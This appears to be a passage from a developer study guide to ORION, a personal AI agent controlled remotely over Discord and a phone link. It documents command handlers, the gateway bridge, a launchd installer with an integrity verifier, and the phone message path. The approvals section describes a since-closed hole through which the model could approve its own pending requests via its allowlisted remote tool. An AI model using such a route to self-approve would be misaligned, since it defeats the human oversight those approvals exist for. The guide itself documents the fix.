#### Approvals: who can approve

`resolveApproval` (`:1096-1125`) first refuses a sender of `""`, `local` or `orion`: "an approval has to come from a person. This one came from the local process." The hole it closes (comment 1097-1108, found 2026-09-02): `orion-remote` is on the model's exec allowlist (`plugin/workspace/TOOLS.md:72` lists it), `orion-remote handle -- approve ap-...` without `--from` defaulted to sender `local`, and `local` is in the default allowlist, so the model could approve its own requests over the channel built for Nick to answer them. The bridge always passes `--from <discord id>` and the phone helper `--from phone`, so refusing `local` costs real channels nothing.

- A **mission approval** (`ap-xxxxxxxx`) is just a status change in `remote.json`: `pending -> approved|denied`, plus `decidedAt`. Minted by `orion-notify` when a long mission blocks.
- A **gate approval** (`A-xxxx`) is delegated to the plugin's own module: it dynamically imports `~/.openclaw/extensions/orion-control/dist/approvals.js` (the installed dist, "the code the daemon runs") and calls `approvalPaths(~/.openclaw/orion-gate/approvals)`, then `deny(paths, id)` or `grant(paths, id, "discord:<who>")` (`:1135-1152`). Reply on success: `approved <ticket.id> — <summary>. Tell him to go ahead.` The grant is recorded with the string `discord:<sender>` even for phone senders (so the plugin's audit says `discord:phone`) **(inferred from the literal at :1148; check `approvals.js` to see whether it parses the prefix)**. Full approval semantics (tickets, nonces, expiry) are in [04_plugin_core_actions_gate.md](04_plugin_core_actions_gate.md).
- Nick can also approve in an ordinary message ("yes, approve A-7F3K"); the plugin reads his own words before the model sees them (brief lines 524-529). That path does not go through `resolveApproval`.

#### The `agent` verb (1159-1493)

Controls the unattended development loop (`orion-agent`, `orion-projects`, `orion-project-agent`) from a phone. One verb with a fixed sub-vocabulary "rather than teaching `pause` and `cancel` a second kind of target": `agent status|pause|resume|stop|exterminate [project-id]`. `exterminate` is two deliberate tokens so nobody stops a night's work by texting "stop". Nothing here can **start** a run ("beginning unattended work on real code is a decision made at the machine").

Target resolution `agentTarget` (1227-1243), most specific first: **named** project id; **running** (the fleet lock `project-agent/active-project.lock/owner.json` names a `projectID`); **only** one project has a `state.json`; **legacy** single-run root `project-agent/`. Several candidates with nothing running -> an ambiguous reply listing up to 15 projects and "Nothing was changed. Name one". The incident: while a project ran, `agent status` answered "no development run exists" and every halt was refused, because the verb read only the pre-project single `state.json` ("A stop button that silently addresses the wrong place is worse than none", 1184-1190).

Execution: `operator = locateOperator()` (1349-1371) finds `scripts/orion-project-agent`: first in `ORION_REPO` (if set) or the checkout containing this file or `~/Desktop/ORION`, requiring `scripts/lib/orion-project-agent.mjs` and a `.git` dir; if the repo is unreachable (launchd cannot read `~/Desktop`: `probe()` returns `blocked` on EPERM/EACCES) it falls back to the installed copy beside this file. Then:

```js
// scripts/orion-remote:1473-1475
const argv = [operator.cli, ...(target.id ? ["--project", target.id] : []), action];
await run(process.execPath, argv, { timeout: OPERATOR_TIMEOUT_MS, maxBuffer: 32 * 1024 * 1024 });
```

`OPERATOR_TIMEOUT_MS = 12000`, deliberately under `withStateLock`'s 15 s stale-lock time (1176-1179). `process.execPath` rather than the shebang because under launchd `PATH` is `/usr/bin:/bin:/usr/sbin:/sbin` and has no `node`. No `--revision` is passed: a halt that can lose a race with the thing it halts is not a halt. After the call the reply is rebuilt from the state read **after** the action (reporting pre-command state once produced "READY" in answer to `agent pause`). `resume` from `local`/`orion` is refused (`fromPerson`, 1404): a halt must not be undoable by the process that was halted. Controller errors are scrubbed by `operatorRefusal` (1385-1393), which cuts any absolute path (`ABSOLUTE_PATH` regex) so no Mac path leaks.

- **Contracts** — Replies are short plain strings, often prefixed `Orion | <TITLE>` then `- ` bullet lines, designed to fit one phone screen / under 1900 Discord characters. Files read/written: `remote.json` (`{missions:{id:{priority,status,history,...}}, pending:{ap-id:{status,request,missionId}}, notify:{...}}`), `missions/<id>/mission.json` and `mission.lock`, `actions/running/*.json`, `actions/cancel/<id>`, `project-agent/**`.
- **Calls out to** — `/usr/bin/pmset -g batt`, `/usr/bin/uptime`, `/bin/df -k /`, `/bin/ps -Ao comm=` (10 s timeouts), `scripts/orion-mission resume|abort`, `scripts/orion-project-agent [--project <id>] status|pause|stop|exterminate|resume`, the plugin's `approvals.js`.
- **History** — `0af5235` 2026-09-02 (phases 43-45: bridge, `device/apps/files`, lock), `0d67b37` 2026-09-02 (repairs: panic button failed open, review fixes), `d9cf665` 2026-08-11 first commit of the file (the `orion-*` wrapper toolbelt); `c2eda84` 2026-09-30 is the first commit that contains `doAgent`, `doAction`, the chat mode and `phoneContext` (found with `git log -S`), so those arrived together with the truth check; `9855d99` 2026-09-26 touched the install side (cancel, integrity).
- **Gotchas & lessons**
  - The apps listing took three attempts to get right (comment 963-984): any bundle gave "62 apps" of system agents; the outermost bundle reported News/Stocks/Home as running because their widget extensions are always alive. The final rule is an executable directly under a top-level bundle's `Contents/MacOS`, in `/Applications`, `/System/Applications` or `~/Applications`.
  - `doFiles` returns metadata only; a macOS privacy block shows up as "cannot read <root> (EPERM) — Orion may not have permission to that folder".
  - Handlers run **inside** `withStateLock`; `doResume` and the agent halt are therefore timed to finish within 15 s. The model turn runs outside any lock.
  - The header comment says the "seven verbs" are the whole vocabulary; there are 12, and the header's "no fallthrough to a model" is false since `c5c5175`. Trust `VERBS` and `handleUnlocked`.
- **Walk it yourself**
  1. `sed -n 195,247p scripts/orion-remote` — the verb table and filler list.
  2. `sed -n 392,443p scripts/orion-remote` — shapes, hints, `usage`.
  3. `grep -n "^async function do\|^function do" scripts/orion-remote` — every handler.
  4. `ls ~/.openclaw/orion-controlled/actions 2>/dev/null` — the running/cancel directories (names only).
- **Questions to ask your tutor**
  1. Why is "no one stops a night's work by texting stop" the reason `exterminate` is separate from `stop`/`cancel`?
  2. Why does `approve` validate the id by shape in the dispatcher and again by lookup in the handler?
  3. What are the two kinds of approval id, who mints each, and why can the model neither mint nor answer them?
  4. Why does `locateOperator` prefer the repo checkout but fall back to the installed copy, and what stale-copy risk does that carry?

---

### 8.5 `scripts/orion-remote-bridge`: the Discord gateway client

- **What it is** — The Mac's outbound link to Discord (Manifest Phase 44). Node 24 (uses the built-in global `WebSocket` and `fetch`). It holds one WebSocket to `wss://gateway.discord.gg/?v=10&encoding=json`, receives `MESSAGE_CREATE` events, drops everything that is not a DM or @mention from an allowlisted account, runs `orion-remote handle` for the rest, and posts the stdout as a Discord message. It owns **no authority**: it does not parse commands. Its design goal is a list of negatives from the manifest: the Mac connects outbound, exposes no public server, needs no port forwarding.
- **Where** — `scripts/orion-remote-bridge` (615 lines). Outline:

| Lines | Content |
|---|---|
| 1-37 | Header (design, token handling, 3 subcommands; its description of dispatch as "append an envelope and drain the queue" is stale, see gotchas) |
| 48-56 | Paths: `CONTROLLED`, `OUTBOX` (declared, unused here), `LINK = remote-link.json`, `REMOTE = ROOT/scripts/orion-remote`. `GATEWAY` and `API` constants. |
| 58-71 | `INTENTS = (1<<9) \| (1<<12) \| (1<<15)`: GUILD_MESSAGES, DIRECT_MESSAGES, MESSAGE_CONTENT (privileged). |
| 73-88 | Opcode table; backoff (base 2 s, cap 300 s), staleness (120 s / 300 s), rotation (12 h) constants. |
| 95-156 | `readEnvFile()` (reads `<ROOT>/.env`), `TOKEN`, `currentAllow()` / `allowedSet()` (re-read per message), `redact()`, `say()`, `warn()`. |
| 158-188 | `writeLink()` (atomic tmp+rename of `remote-link.json`), `presenceOf()` -> online/stale/offline/unknown. |
| 190-248 | `dispatch()` (spawn `orion-remote handle`), `send()` (REST post). |
| 250-501 | `connectOnce()`: one WebSocket attempt, all gateway opcodes, `MESSAGE_CREATE` handling. |
| 503-554 | `backoff()`, `serve()` retry loop. |
| 556-615 | CLI: `status`, `whoami`, `probe`, `run`; token and TLS pre-flight. |

- **How it works** — step by step:

1. **Start-up** (`:562-587`). Command is `argv[2]`, default `status`. `status` reads `remote-link.json` and prints presence, last seen, session id, bot name, last error; it connects to nothing (`:564-574`). For any other command, no token -> `fail("no ORION_DISCORD_BOT_TOKEN in the environment or .env. This bridge is inert without one")`. If `NODE_TLS_REJECT_UNAUTHORIZED === "0"` it refuses to run (`:585`): "an authenticated transport whose certificate is not checked is an unauthenticated one that looks fine".
2. **`whoami`** (`:589-609`): read-only REST calls with the bot token: `GET /users/@me`, `GET /users/@me/guilds`, `GET /guilds/{id}`, `GET /users/{owner_id}`; prints bot, guilds and owners so the account to allowlist can be read off the server rather than guessed. Tells Nick to put `ORION_REMOTE_ALLOW=<id>` in `.env`. Granting authority stays a deliberate human act.
3. **`probe`** = `serve({once:true})`: connect, identify, wait for `READY`, write link state, disconnect, exit 0. **`run`** = `serve({once:false})`: loop forever.
4. **`serve`** (`:514-554`) calls `connectOnce`. Outcomes: `stop` (fatal) writes `state:"offline", lastError` and exits 1; `resume` resets the failure count to 0; `retry` increments it; then it sleeps `backoff(failures)` = `2000 * 2^(n-1)` ms, capped at 300000, with jitter that only **reduces** (x 0.5 to 1.0), so the cap stays a cap and the delay is never zero. It carries `session`, `resumeURL`, `seq` between attempts so it can RESUME.
5. **`connectOnce`** (`:258-501`):
   - URL is the `resume_gateway_url` if resuming, else the default gateway.
   - `HELLO` (op 10): start heartbeating at Discord's `heartbeat_interval`, with a jittered first beat (`interval * random()`). A beat while the previous is un-ACKed means a zombie socket: `finish({next:"retry", why:"heartbeat not acknowledged"})`. Then send `RESUME {token, session_id, seq}` if a session exists, else `IDENTIFY` with `intents`, `properties {os:"macos", browser:"orion", device:"orion"}` and a presence "Watching the Mac" (activity type 3, status online) so the member list shows the bot as up.
   - `HEARTBEAT_ACK` (11): clear `awaitingAck`, `writeLink({lastSeen:now, state:"online"})`. This is how `remote-link.json` stays fresh.
   - `HEARTBEAT` (1) from the gateway: answer immediately. `RECONNECT` (7): `finish(next:"resume")`. `INVALID_SESSION` (9): if `d !== true` clear the session (re-identify), else resume. Obeying this "is what stops a reconnect loop turning into an identify-rate-limit ban".
   - `READY`: store `selfID`, `session_id`, `resume_gateway_url`; write link `{state, lastSeen, lastError:null, connectionId, establishedAt, failedAttempts:0, botUser, guilds}`; call `onReady` (prints "connected as <name> (N guild(s))" and warns if `ORION_REMOTE_ALLOW` is still `local`); in probe mode, finish.
   - Close codes **4004** (token rejected), **4013** (invalid intents), **4014** (a privileged intent is not enabled) are fatal (`stop`): "configuration, not weather". Anything else retries.
   - Rotation: unless probing, after 12 h `finish(next:"resume", why:"rotating the connection")`; Discord's own limit is 15 minutes of silence, 12 h is the manifest's `RotationPolicy`.
   - **`MESSAGE_CREATE`** (`:396-491`), in order: ignore bots (`author.bot`); `isDM = !guild_id`; `mentionsOrion` = `mentions` contains `selfID`; a channel message without a mention is **heard, not obeyed**, and prints a one-time-per-connection notice ("heard ... but not addressed to me -- DM me, or start with @orion"); strip a leading `<@id>` or `<@!id>`; empty text -> one-time warning; **allowlist pre-filter**: author id not in `allowedSet()` -> one-time warning, return (strangers dropped before anything is spawned; the rate limiter sits behind the allowlist so it would never see them); then log `<- [id] text(160)`, `dispatch`, `send`, log `-> reply(160)`; on exception `dispatch failed: ...`.
6. **`dispatch`** (`:199-236`): runs

```js
// scripts/orion-remote-bridge:222-225
handled = await run(process.execPath,
  [REMOTE, "handle", "--from", authorID, "--id", messageID, "--at", String(sentAt), "--", text],
  { timeout: 180_000, env: childEnv });   // childEnv = { ...process.env, ORION_REMOTE_ALLOW: currentAllow() }
```

   `sentAt` is `Date.parse(message.timestamp)` (Discord's message time). A thrown error whose `code === 1` and whose stdout is non-empty is treated as a refusal and its stdout is forwarded; anything else (spawn failure, timeout) is a transport error logged as `dispatch failed`. The 180 s limit (not 120) exists because "a brain turn is allowed 90 seconds and the agent call itself waits 120"; at 120 the poll timeout "would kill the child mid-thought".
7. **`send`** (`:238-248`): `POST https://discord.com/api/v10/channels/{channelID}/messages`, headers `Authorization: Bot <token>` and `Content-Type: application/json`, body `{content: text.slice(0,1900)}`. Discord's cap is 2000 characters; truncation keeps a long answer arriving shortened instead of not at all. Failures log `reply failed: <status> <body 200>` and are not retried. The reply goes to the **same channel** (or DM) the message arrived in. There are no embeds, attachments, typing indicators, or message edits (so no streaming).

- **Contracts** — Commands: `orion-remote-bridge [status|whoami|probe|run]` (default `status`; anything else prints `usage: orion-remote-bridge [status|probe|run]`, exit 2, note the usage text omits `whoami`). No flags. Env/`.env` keys read: `ORION_DISCORD_BOT_TOKEN`, `ORION_REMOTE_ALLOW`, `NODE_TLS_REJECT_UNAUTHORIZED` (only to refuse `0`). The `.env` is `<ROOT>/.env`: in the repo that is `ORION/.env`; in the installed copy it is `~/.openclaw/orion-remote/.env` containing only the two values. File written: `~/.openclaw/orion-controlled/remote-link.json` (mode 0600; fields `state`, `lastSeen`, `lastError`, `connectionId`, `establishedAt`, `failedAttempts`, `botUser`, `guilds`, `updatedAt`). It carries no token, no content, no message text. The Mac app reads it as the Discord half of the phone's four presences (online/stale/offline/unknown); Swift side is `MobileCore/RemoteLink.swift` (`HeartbeatPolicy.standard`, line 133, interval 30, stale 120, offline 300).
- **Calls out to** — Discord Gateway WebSocket `wss://gateway.discord.gg/?v=10&encoding=json` (and the `resume_gateway_url`), Discord REST `https://discord.com/api/v10` (`POST /channels/{id}/messages`; `GET /users/@me`, `/users/@me/guilds`, `/guilds/{id}`, `/users/{id}` for `whoami`), and `node orion-remote handle ...`.
- **History** — `0af5235` 2026-09-02 "the Discord bridge, three read-only capabilities, and a lock that reaches them"; `0d67b37` 2026-09-02 repairs (including the allowlist being captured at start-up; now per message); `f33f92c` 2026-09-02 "a successful connection clears the last error"; `750322e` 2026-09-02 "closed by a real Discord round trip" (Phase 45 close); `c5c5175` 2026-09-02 "a DM reaches the Orion brain"; `c2eda84` 2026-09-30 (truthful replies; bridge touched).
- **Gotchas & lessons**
  - **MESSAGE_CONTENT contradiction in the file itself.** The `INTENTS` constant includes the privileged `MESSAGE_CONTENT` bit and the comment at 58-71 says it was re-enabled on Nick's correction of 2026-09-02 (he is the only member of the ORION guild). But the empty-content warning at `:448-450` still says "This bot deliberately does not hold the Message Content intent, so it only reads DMs and messages that @mention it." That text is stale; trust the code (`INTENTS`) and the 4014 handler.
  - **Stale header.** The comment at 192-198 says `dispatch` "appends an envelope and asks `orion-remote` to drain the queue, exactly as a local `inject` would". The code calls `handle` directly with `--from/--id/--at`. `OUTBOX` is declared but not used.
  - **No outbound rate handling for Discord REST** (no 429 retry in `send`), and no handling of the interaction between a >180 s turn and a user who sends a second message: each message is its own `dispatch`, running concurrently (the event handler is `async` and not serialized). Two quick messages therefore run two `orion-remote handle` processes at once and the second may get "You have a turn running at the Mac" **(inferred from the gateway's busy refusal and the absence of a queue)**.
  - The bot reads **only** `message.content`; attachments, embeds and stickers are ignored, so photos sent on Discord never reach ORION.
  - `launchd` keeps it alive (`KeepAlive`), but `ThrottleInterval 30` throttles restarts. A bad token or disabled intent exits 1 on purpose, and launchd retries every 30 s forever until config is fixed.
- **Walk it yourself**
  1. `scripts/orion-remote-bridge status` — reads `remote-link.json` only, connects to nothing, prints no secrets. (It does read a local file; safe.)
  2. Open `scripts/orion-remote-bridge` at 396 and follow `MESSAGE_CREATE` to the `dispatch` call.
  3. `tail -n 30 ~/Library/Logs/orion/remote-bridge.log` — the bridge's stdout/stderr (it prints the first 160 characters of each inbound and outbound message, so it contains conversation text; do not paste it).
  4. Do **not** run `probe`, `run` or `whoami`: they open a network connection with the bot token.
- **Questions to ask your tutor**
  1. Why does the bridge pre-filter strangers when `orion-remote` already refuses them?
  2. Why distinguish "reading everything" from "obeying everything", and what does `isCommand`-style addressing (DM or @mention) prevent?
  3. Explain RESUME vs IDENTIFY vs INVALID_SESSION and why the backoff only ever reduces jitter.
  4. What is in `remote-link.json`, who reads it, and why does it carry no message text?
  5. What would happen if the Mac slept for two hours: what does Discord do, what does the bridge do on wake?


---

### 8.6 `scripts/orion-remote-install` and the LaunchAgent

- **What it is** — A bash script (209 lines) that makes the Discord bridge persistent under launchd. The key idea: **launchd cannot read `~/Desktop`** (macOS privacy/TCC), and the repo lives on the Desktop. A launchd job rooted there fails with "getcwd: cannot access parent directories: Operation not permitted". The repo's AGENTS.md records the cost: the TTS daemon's launch agent could never be installed and stayed dead for nineteen days. The fix is not to fight TCC but to stop needing it: copy `scripts/` to `~/.openclaw/orion-remote/` and run from there, as OpenClaw's own gateway agent does.
- **Where** — `scripts/orion-remote-install` (header 1-31; option parsing 45-52; `fingerprint` 54-63; `status` 67-82; `remove` 84-90; install 92-208).
- **How it works**
  1. Options (`:45-52`): none = install and start; `--status`; `--remove`; `-h|--help` prints lines 2-8 of the file; any other option prints `unknown option: <x>` and exits 64.
  2. Paths: `INSTALL=~/.openclaw/orion-remote`, `PLIST=~/Library/LaunchAgents/com.nickmadaio.orion.remote.plist`, `LABEL=com.nickmadaio.orion.remote`, `LOGDIR=~/Library/Logs/orion`, `NODE=~/.openclaw/tools/node-v24.15.0/bin/node` (falls back to `command -v node`).
  3. **`--status`** prints: label; loaded (`launchctl list | grep`); running (`pgrep -f "orion-remote/scripts/orion-remote-bridge run"`); installed copy path plus a 12-hex SHA-256 fingerprint; repo fingerprint; a `DRIFTED` warning if they differ; `integrity` (output of `lib/orion-integrity.mjs verify orion-remote <install>`); the log path. The fingerprint hashes the bridge, `orion-remote`, `orion-project-agent`, `lib/orion-project-agent.mjs` and `lib/agentic/*.mjs` (the controller that a Discord `agent stop` falls back to), so a stale controller shows as drifted too.
  4. **`--remove`**: `launchctl bootout gui/<uid>/<label>` (or `launchctl unload`), delete the plist and `~/.openclaw/orion-remote`, print "removed. Orion no longer answers remotely."
  5. **install**: read `ORION_DISCORD_BOT_TOKEN` and `ORION_REMOTE_ALLOW` from `<repo>/.env` using a tiny inline Node snippet (never printing them); no token -> exit 2; no allowlist -> a warning that the bridge will refuse every message, installs anyway. Then `rm -rf $INSTALL/scripts; cp -R $REPO/scripts $INSTALL/scripts` (drops `__pycache__`); copy the Swift calendar bridge `native/OrionMacBridge/.build/release/orion-mac-bridge` to `$INSTALL/bin/orion-mac-bridge` if built (used by the life-loop scripts that the app and the phone link run from the installed copy); write `$INSTALL/.env` with **only those two values**, mode 0600 under `umask 077`: "a second copy of a secret is a second thing that can leak", so the Anthropic key, keyring password and webhook stay in the repo `.env`.
  6. **Integrity (Phase 48)**: copy `lib/orion-integrity.mjs` to `~/.openclaw/orion-gate/integrity/verifier.mjs` (outside the copy it guards) and `record orion-remote $INSTALL`, which writes a SHA-256 manifest of every installed file into the gate directory `~/.openclaw/orion-gate/integrity/` (`scripts/lib/orion-integrity.mjs:1-25`). Its own header is honest about the limit: it stops replacement by anything that cannot write the gate directory, which is everything ORION can do, but a user-level attacker who can write that directory could rewrite the manifest too. launchd starts the verifier, which starts the bridge only if every file (including the `.env`) is what was installed.
  7. **Write the plist** and load it:

```xml
<!-- generated by scripts/orion-remote-install:144-173 -->
<key>Label</key><string>com.nickmadaio.orion.remote</string>
<key>ProgramArguments</key><array>
  <string>~/.openclaw/tools/node-v24.15.0/bin/node</string>
  <string>~/.openclaw/orion-gate/integrity/verifier.mjs</string>
  <string>run</string><string>orion-remote</string><string>~/.openclaw/orion-remote</string>
  <string>--</string>
  <string>~/.openclaw/tools/node-v24.15.0/bin/node</string>
  <string>~/.openclaw/orion-remote/scripts/orion-remote-bridge</string><string>run</string>
</array>
<key>WorkingDirectory</key><string>~/.openclaw</string>   <!-- "This line is the whole point." -->
<key>RunAtLoad</key><true/>  <key>KeepAlive</key><true/>  <key>ThrottleInterval</key><integer>30</integer>
<key>StandardOutPath</key><string>~/Library/Logs/orion/remote-bridge.log</string>  <!-- same for StandardErrorPath -->
```

  (Paths shown with `~` for readability; the real plist holds absolute paths. I read only the key names and argument structure of the installed plist to confirm it matches this template. The installed file is `~/Library/LaunchAgents/com.nickmadaio.orion.remote.plist`.)
  8. Start: `launchctl bootout` (wait up to 10 s, 50 x 0.2 s, for launchd to drop the old job), then `launchctl bootstrap gui/<uid> <plist>` retried 5 times with 1 s sleeps, falling back to `launchctl print` to detect a load; if it never loads: `FAILED: launchd would not load <plist> — the bridge is NOT running.` exit 1; then `launchctl kickstart -k`. History: the first version swallowed the `bootstrap` error ("Input/output error" while bootout was still finishing) and printed success with the bridge off.
- **Contracts** — Writes: `~/.openclaw/orion-remote/**`, `~/.openclaw/orion-remote/.env` (0600), `~/.openclaw/orion-gate/integrity/verifier.mjs` (+ its manifest), the plist, `~/Library/Logs/orion/remote-bridge.log` (created by launchd). Reads: `<repo>/.env` (two keys, never printed), the repo `scripts/`. Exit codes: 0 ok, 1 launchd would not load, 2 no node / no token, 64 unknown option.
- **LaunchAgent names**: label `com.nickmadaio.orion.remote`; plist `~/Library/LaunchAgents/com.nickmadaio.orion.remote.plist`. Other ORION plists in the same directory (names only): `com.nickmadaio.orion.dashboard`, `com.nickmadaio.orion.tts`, `com.nickmadaio.orion.voiceid`. The phone helper is **not** a LaunchAgent: it is a login item (`SMAppService.loginItem`, bundle id `com.nickmadaio.orion.link`) started by Orion.app (`native/Orion/Sources/Orion/PhoneLink.swift:9-27`).
- **History** — `ea71395` 2026-09-02 "persistent under launchd, by installing outside ~/Desktop"; `9855d99` 2026-09-26 (phases 40-52: integrity verifier wrapping the launch, the Phase 48 mechanism); `c2eda84` 2026-09-30 (copies the calendar bridge for the life-loop; truthful-replies release).
- **Gotchas & lessons**
  - **The installed copy is what runs.** After any edit to `orion-remote`, `orion-remote-bridge`, `scripts/lib/remote/*` or the thinking policy, nothing changes on the phone or Discord until you re-run `scripts/orion-remote-install`. `scripts/lib/agentic/brief.mjs:250-257` repeats this to the development agent. The chapter 05 file notes the installed `orion-remote` and `lib/remote/*` were byte-identical to the repo at the snapshot (a `cmp`). **Deploy drift is a recurring risk**: the phone path uses the installed copy even though Swift builds from the repo.
  - **Re-running install touches the integrity manifest and restarts the bridge** (`kickstart -k`), which drops the Discord connection for a moment. Not safe to run casually while a Discord turn is in flight.
  - The installed `.env` has no `ORION_REMOTE_ALLOW` unless the repo `.env` did; the allowlist is then `local` and every Discord message is silently refused. The bridge prints a note about this at connect.
  - Only the bridge is under launchd. The orion-remote `handle` processes for the **phone** are spawned by the helper app, not launchd, with `ORION_REMOTE_ALLOW=phone` set by `CommandRunner.environment` (`native/OrionLink/Sources/LinkCore/CommandRunner.swift:41`; see 8.7).
- **Walk it yourself**
  1. `scripts/orion-remote-install --status` — prints loaded/running/fingerprints/drift; read-only.
  2. `launchctl list | grep orion` — which ORION jobs are loaded.
  3. Open `scripts/orion-remote-install` at 33-63 and read why the fingerprint covers the project-agent files.
  4. Never run it with no argument unless you intend to reinstall.
- **Questions to ask your tutor**
  1. Why does launchd's inability to read `~/Desktop` force a copy, and what are the two consequences (drift and a smaller `.env`)?
  2. What does the integrity verifier protect against that a plain `KeepAlive` agent does not?
  3. Why does the plist run `node verifier.mjs run orion-remote <dir> -- node bridge run` instead of running the bridge directly?
  4. Why is `process.execPath` used inside `orion-remote` for child scripts instead of relying on shebangs?


---

### 8.7 The phone path end to end (integrated trace, re-verified)

This integrates the dossier `docs/learn/_fragments/raw/trace-phone-message.md`. I re-checked its line numbers against the tree at 6c93032; where they were off I give the corrected ones. The headline: **the phone does not talk HTTP to a server and does not use `GatewayClient.swift`.** The path is phone -> private CloudKit `LinkCommand` record -> the **ORION Link helper** (`native/OrionLink`) on the Mac polls every 4 s -> `orion-remote handle --mode chat` -> `openclaw agent` -> reply written onto the same record -> the phone picks it up by silent push or its own 4 s poll. "The phone gains no authority Discord does not already have": the Mac runs every phone command through the same `orion-remote handle` gate (`native/OrionMobile/Sources/MobileCore/LinkSnapshot.swift:17-50`).

| # | Hop | Where (verified) | What happens |
|---|---|---|---|
| 1 | Composer | `native/OrionMobile/App/ConversationView.swift:270-275` | `send()` calls `remote.say(text, conversation:, model:)`. Voice mode and tapped suggestions call it too. `conversationID` is nil until "New chat" creates a UUID. |
| 2 | `RemoteStore.say` | `native/OrionMobile/App/RemoteViews.swift:222-240` | `static let answerOnDevice = false` (`:156-160` area). Since 2026-10-12 (`a44ce44`, Nick: "make the phone use only the api rather than this stupid local model") every message goes to the Mac and waits if the Mac is away. Before each chat message it sends a separate `kind: .log` record with the phone's Screen Time lock state, "so ORION knows it before reading 'unlock my apps'". |
| 3 | Write the record | `native/OrionMobile/App/CloudLink.swift:200-224` | A `LinkCommand` CKRecord in the private database, zone `OrionLink`, recordName = a UUID: fields `text`, `sentAt`, `status="pending"`, `device="iphone"`, `kind="chat"`, optional `conversationID`, `model`. `LinkCommand.validate` (`LinkSnapshot.swift:323-332`) trims, turns control characters into spaces, allows 1-2000 characters ("orion-remote takes up to 4000 bytes"). A CloudKit error marks it `failed` ("Not sent: ..."); there is no retry or outbox for chat. |
| 4 | Shared contract | `native/OrionMobile/Sources/MobileCore/LinkSnapshot.swift:17-64` | Container `iCloud.com.nickmadaio.orion`, zone `OrionLink`, record types `MacState`, `LinkCommand`, `LinkAlert`. `LinkSchema.sender = "phone"` at `:49`. |
| 5 | Helper is kept running | `native/Orion/Sources/Orion/PhoneLink.swift:9-27` | ORION Link is a login item embedded at `Contents/Library/LoginItems/ORION Link.app`, bundle id `com.nickmadaio.orion.link`, signed with Nick's developer team (CloudKit needs it). Orion.app registers it (`SMAppService.loginItem`), restarts it if its binary is newer, and reads `~/Library/Application Support/ORION Link/status.json`; "alive" if written within 30 s. |
| 6 | Helper loop | `native/OrionLink/App/LinkEngine.swift:74-94` | Every 4 s: `pollCommands`, `publishChats`, `handleWidgetRequests`, every 8th tick `deliverCheckins`, `deliverOutreach`, `publishState(force: ticks % 8 == 1)`. No CloudKit subscription on the Mac side. A `busy` guard serializes ticks. |
| 7 | Fetch pending | `LinkEngine.swift:331-368` | `recordZoneChanges` since UserDefaults `link.changeToken`; keep `status == "pending"`; sort by `sentAt`; handle each; **advance the token only after all are handled** (a crash re-fetches; orion-remote's replay guard then refuses duplicates). |
| 8 | Stale check and run | `LinkEngine.swift:370-389`, `staleAfter = 10 * 60` at `:44` | Older than 10 minutes (logs: 36 h): fail without running, "Not run: this was sent more than ten minutes ago. ...". Else write `status="running"` back (phone shows "ORION is thinking..."), then `Task.detached { runner.run(...) }`. `kind == .plan` goes to `PlanRequestFile` for Orion.app, not chat. |
| 9 | `CommandRunner` | `native/OrionLink/Sources/LinkCore/CommandRunner.swift:21, 34-36, 41, 55-57, 70, 74-75` | Runs `~/.openclaw/tools/node-v24.15.0/bin/node ~/.openclaw/orion-remote/scripts/orion-remote handle --from phone --id <recordName> --at <ms> --mode chat\|command -- <text>` with env `ORION_REMOTE_ALLOW=phone`, `PATH=/opt/homebrew/bin:/usr/local/bin:/usr/bin:/bin`, and for chat `ORION_BRAIN_SESSION = "orion-chat-<conversationID>"` (or `orion-app-v2` with no conversation); if a model was picked, `ORION_BRAIN_MODEL=<m>` and `ORION_BRAIN_THINKING = off` for `ollama/*`, else `low` (this overrides the per-message policy). **Timeout 180 s**, then `terminate()` and "ORION did not answer within 180 seconds." Exit 0 = ok (stdout capped to 4000 chars, empty = "Done."); exit 1 with output = a refusal whose text is forwarded; otherwise failure. This is the **installed copy** of orion-remote, not the repo's. |
| 10 | orion-remote guards | `scripts/orion-remote:1518, 1532, 1557, 1562, 1594, 1607, 1635` | In this order: allowlist, device routing, parse (chat mode = no verbs), LOCK, age (10 min), replay + rate limit, size (4000 bytes). Section 8.2. (Dossier cited 1512-1520, 1557, 1588-1592, 1612, 1630-1639; corrected here: age is 1587-1598, `admitInbound` call is 1607, size check is 1635, `askBrain` call is 1639.) |
| 11 | The brain call | `scripts/orion-remote:91, 96, 723-746, 790-813` | `askBrain` -> `askBrainOnce` -> `openclaw agent --session-key ... --timeout 90 [--model] --thinking ... --json --message-file brain-<hex>.txt`. Prompt = `phoneContext()` + standing-rules note + `briefFor("phone")` + the marker line + his text. Section 8.3. |
| 12 | "Thinking" text | `native/OrionMobile/Sources/MobileCore/ChatThinking.swift:4-25`, used at `CommandRunner.swift:74` | After a successful (exit 0) chat turn the helper reads the session transcript under `~/.openclaw/agents/main/sessions` (index key `agent:main:<session>`), and collects assistant `thinking` blocks timestamped after the turn began. It does not come from orion-remote's output. |
| 13 | Reply written back | `LinkEngine.swift:416-428` | Same record: `status` done/failed, `reply`, `thinking`, `repliedAt`, `conversationID` (`"phone-history"` if none, `:512`). If saving fails nothing retries; the record stays "running". `archiveChat` (`:510-518`) merges the exchange into `~/.openclaw/orion-controlled/chats` (the store Orion.app reads). Reverse direction: `publishChats` (`:519-551`) copies Mac-started chats to the phone as `LinkCommand` records with `device="mac-chat"`. |
| 14 | Phone is notified | `CloudLink.swift:50-62, 82-114` | Two subscriptions: silent zone subscription `orion-link-zone` and visible alert subscription `orion-link-alerts` on `LinkAlert`; plus a 4 s poll while the app is open. Silent pushes reach `OrionMobileApp.swift:86-88`, which posts `.orionLinkChanged`. |
| 15 | Read change feed | `CloudLink.swift:129-187` | `recordZoneChanges` since UserDefaults `link.phoneToken`; `MacState` drives presence; `LinkCommand` rows become messages; the last 200 are kept (`:190`). |
| 16 | Display | `RemoteViews.swift:128-141`, `ConversationView.swift:112-128` | pending/running -> "Sent to your Mac..." / "Waiting for your Mac to come online..." / "ORION is thinking..."; done/failed -> reply with an optional "Thinking" disclosure. Voice mode gives up after 90 s ("That's taking a while..."). |
| 17 | Presence | `MobileCore/RemoteLink.swift:133, 154-163` | From the age of `MacState.generatedAt`: < 120 s online, 120-300 s stale, >= 300 s offline. The helper republishes at least every ~32 s. |
| 18 | Mac unreachable | `RemoteViews.swift:166-200`, `OfflineBrain.swift` | Today the record just sits "pending"; on return anything under 10 min old runs. The Apple on-device model path exists but is switched off (`answerOnDevice = false`). |

